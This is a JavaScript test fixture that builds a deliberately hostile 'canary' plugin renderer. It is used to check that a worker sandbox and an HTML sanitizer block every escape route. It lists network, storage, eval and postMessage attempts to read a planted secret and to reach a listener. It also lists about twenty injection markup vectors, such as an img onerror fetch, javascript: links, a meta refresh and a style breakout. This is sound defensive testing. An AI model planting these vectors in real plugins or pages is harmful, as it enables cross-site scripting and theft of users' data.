/**
 * The npm-plugin CANARY: a deliberately hostile plugin renderer, kept in fixtures and never shipped
 * (threat-model note engineering/decisions/2026-10-16-npm-plugin-threat-model.md §5.2 part 1).
 *
 * It is a fence renderer written the way a stranger would write one: a self-contained ES module
 * with one `render` function and a final `export { render as default }`. It tries every way out
 * the note names that a worker can reach, and it writes what each attempt did into its own
 * output, so a test can read the result as well as the network log.
 *
 *   NETWORK   fetch, XMLHttpRequest, WebSocket, EventSource, sendBeacon, WebTransport (UDP),
 *             importScripts, Worker (from a URL and from a blob), SharedWorker, FontFace
 *   STORAGE   localStorage, sessionStorage, document.cookie, cookieStore, indexedDB, caches,
 *             navigator.storage, a service worker registration
 *   CODE      eval, Function, a string handed to setTimeout
 *   RUNNER    postMessage to whatever hosts the worker
 *
 * Each attempt is named. An outcome is one of:
 *   `blocked:<ErrorName>`   the call threw, or the API is not there
 *   `tried`                 the call returned without throwing; only the listener can say whether
 *                           anything left
 *   `read:<value>`          a storage read returned data. This is the outcome a test must never see
 *                           from the locked page.
 *
 * The markup half (`CANARY_MARKUP`) is what a renderer returns to reach the network through the
 * page that will show it (an image, a stylesheet, a form, a frame). The host's sanitizer must
 * drop every one; the export check opens the unsanitized form to prove each fires.
 *
 * ADDING AN EXIT: a reviewer who names one adds it to ATTEMPTS (a `[name, "js expression"]` pair
 * that returns `undefined` to mean "tried") and to nothing else. The door test, the control arm
 * and the weakened arm all read this list.
 */

/** Seed values the control arm plants where the canary can see them (the locked page must read none). */
const SECRET = 'canary-secret-7f3a';

/**
 * Every attempt the renderer makes. `H` is the listener's origin, `P` its port, `udp` the ports of
 * UDP sockets (one for WebRTC STUN, one for WebTransport). Each string is the body of a
 * function that throws or returns a value; the renderer writes `read:` when the value is a
 * string, number or boolean.
 * @param {{ H: string, P: number, udp: { stun: number, quic: number } }} o
 * @returns {Array<[string, string]>}
 */
function attempts({ H, P, udp }) {
  const bits = (v) => JSON.stringify(v);
  return [
    // — the network
    ['fetch', `return fetch(${bits(`${H}/fetch`)}).catch(function(){});`],
    ['xhr', `var x = new XMLHttpRequest(); x.open('GET', ${bits(`${H}/xhr`)}); x.send();`],
    ['websocket', `return new WebSocket(${bits(`ws://127.0.0.1:${P}/websocket`)});`],
    ['eventsource', `return new EventSource(${bits(`${H}/eventsource`)});`],
    ['beacon', `return navigator.sendBeacon(${bits(`${H}/beacon`)}, 'x');`],
    ['importscripts', `importScripts(${bits(`${H}/importscripts`)});`],
    ['worker-url', `return new Worker(${bits(`${H}/worker-url`)});`],
    ['worker-blob', `return new Worker(URL.createObjectURL(new Blob(["fetch(${H}/worker-blob)"])));`],
    ['sharedworker', `return new SharedWorker(${bits(`${H}/sharedworker`)});`],
    ['fontface', `return new FontFace('x', ${bits(`url(${H}/fontface)`)}).load().catch(function(){});`],
    ['webtransport', `return new WebTransport(${bits(`https://127.0.0.1:${udp.quic}/webtransport`)});`],
    ['webrtc', `var pc = new RTCPeerConnection({ iceServers: [{ urls: ${bits(`stun:127.0.0.1:${udp.stun}`)} }] }); pc.createDataChannel('x'); pc.createOffer().then(function (o) { return pc.setLocalDescription(o); }); return pc;`],
    // — storage, read and write
    ['localstorage', `localStorage.setItem('canary', 'w'); return localStorage.getItem('secret');`],
    ['sessionstorage', `sessionStorage.setItem('canary', 'w'); return sessionStorage.getItem('secret');`],
    ['cookie', `document.cookie = 'canary=w'; return document.cookie;`],
    ['cookiestore', `return cookieStore.get('secret');`],
    ['indexeddb', `return indexedDB.open('secret');`],
    ['caches', `return caches.open('secret');`],
    ['storage-bucket', `return navigator.storage.getDirectory();`],
    ['serviceworker', `return navigator.serviceWorker.register(${bits(`${H}/serviceworker.js`)});`],
    // — code built from a string
    ['eval', `return eval('1 + 1');`],
    ['function', `return new Function('return 1')();`],
    ['settimeout-string', `setTimeout('1', 0);`],
    // — the runner
    ['postmessage', `postMessage({ id: 0, out: '<script>alert(1)</script>' });`],
  ];
}

/**
 * The markup a hostile renderer returns, aimed at the page that will show it. Every tag here
 * reaches `origin` when it is parsed in an ordinary online page and must not survive the host's
 * sanitizer. Each carries a unique path so a hit names its vector.
 * @param {string} H  the listener's origin
 * @returns {Record<string, string>}  vector name → markup
 */
function markupVectors(H) {
  return {
    img: `<img src="${H}/m-img" alt="">`,
    'css-background': `<div style="background:url(${H}/m-cssbg);width:9px;height:9px"></div>`,
    'style-import': `<style>@import url(${H}/m-import);</style>`,
    'style-breakout': `<style></style><img src="${H}/m-breakout"></style>`,
    link: `<link rel="stylesheet" href="${H}/m-link">`,
    prefetch: `<link rel="prefetch" href="${H}/m-prefetch">`,
    iframe: `<iframe src="${H}/m-iframe"></iframe>`,
    object: `<object data="${H}/m-object"></object>`,
    embed: `<embed src="${H}/m-embed">`,
    form: `<form action="${H}/m-form" method="post"><input type="submit" id="m-form-submit"></form>`,
    'svg-image': `<svg><image href="${H}/m-svgimage"/></svg>`,
    'svg-use': `<svg><use href="${H}/m-svguse#x"/></svg>`,
    video: `<video poster="${H}/m-poster" src="${H}/m-video"></video>`,
    audio: `<audio src="${H}/m-audio" autoplay></audio>`,
    ping: `<a href="#x" ping="${H}/m-ping" id="m-ping">p</a>`,
    meta: `<meta http-equiv="refresh" content="0;url=${H}/m-meta">`,
    base: `<base href="${H}/m-base/">`,
    script: `<script src="${H}/m-script"></script>`,
    handler: `<img src="x" onerror="fetch('${H}/m-handler')">`,
    javascript: `<a href="javascript:fetch('${H}/m-javascript')" id="m-js">j</a>`,
  };
}

/**
 * The plugin's `render.js` text: a worker-safe renderer that runs `attempts` and then returns the
 * report plus the markup half. `withMarkup: false` returns the report alone.
 * @param {{ H: string, P: number, udp: { stun: number, quic: number }, withMarkup?: boolean }} o
 * @returns {string}
 */
function canarySource(o) {
  const list = attempts(o);
  const markup = o.withMarkup === false ? '' : Object.values(markupVectors(o.H)).join('');
  return `
function render(fence, kit) {
  var out = [];
  var note = function (name, v) { out.push('<li>' + name + '=' + String(v).replace(/[<>&"]/g, '?') + '</li>'); };
  var attempts = [
${list.map(([n, body]) => `    [${JSON.stringify(n)}, function () { ${body} }]`).join(',\n')}
  ];
  attempts.forEach(function (a) {
    try {
      var r = a[1]();
      if (r !== undefined && r !== null && typeof r !== 'object' && typeof r !== 'function') note(a[0], 'read:' + r);
      else note(a[0], 'tried');
    } catch (e) {
      note(a[0], 'blocked:' + (e && e.name));
    }
  });
  return '<ul class="canary-report" id="' + fence.id + '">' + out.join('') + '</ul>' + ${JSON.stringify(markup)};
}
export { render as default };
`;
}

module.exports = { SECRET, attempts, markupVectors, canarySource };
